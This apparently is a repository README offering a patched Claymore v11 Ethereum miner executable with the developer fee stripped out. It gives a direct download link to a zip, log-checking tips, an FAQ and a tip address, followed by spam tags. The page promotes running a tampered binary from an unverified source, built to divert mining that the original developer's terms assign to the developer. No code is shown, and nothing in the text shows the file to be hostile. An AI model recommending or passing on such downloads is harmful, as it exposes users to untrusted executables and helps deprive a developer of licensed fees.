## claymore v.11.0 no developer's fee
claymore dualminer v11 without developers fee 

This is v11 of Claymore Ethereum Miner with the DevFee removed

The "EthDcrMiner64.exe" is patched. You don't have to do anything, just start mining with the usual .bat

Once devfee mining is triggered it will mine to your address instead of developers. To make sure everything is working properly check the mining .txt logs for any "eth_submitLogin" where your address doesn't appear. If there are any then restart mining again and it should work properly. Otherwise contact me.
Download Claymore 11.0 Ethereum Miner No DevFee Below

## Direct download link:
https://github.com/weezy007/claymore-v.11-no-dev-fee/raw/master/claymore%20v11%20nodevfee.zip


## FAQ 
Will it work for future releases of Claymore ?

-No I will have to update the releases manually.

Lower Hashrate than with original Claymore?

-Please run it for at least 12-24h, to make up for the downtime when you sitched to the no fee version and even out the usual volatility.
######## Tips ETH : 0x0F9984cFe2482cD38D21B3dE2741f9142FA95FD7

Tags:
Claymore 11 Claymore 11 Miner Claymore 11 Ethereum Miner Claymore 11 No Fee Claymore No DevFee 11 Claymore Miner AMD Nvidia Ethereum Claymore Miner Ethereum Claymore Miner 11 Ethereum Claymore No Fee Miner DevFee Claymore Remove Remove DevFee ClaymoreEthDcrMiner64.exe Remove Developers Fee
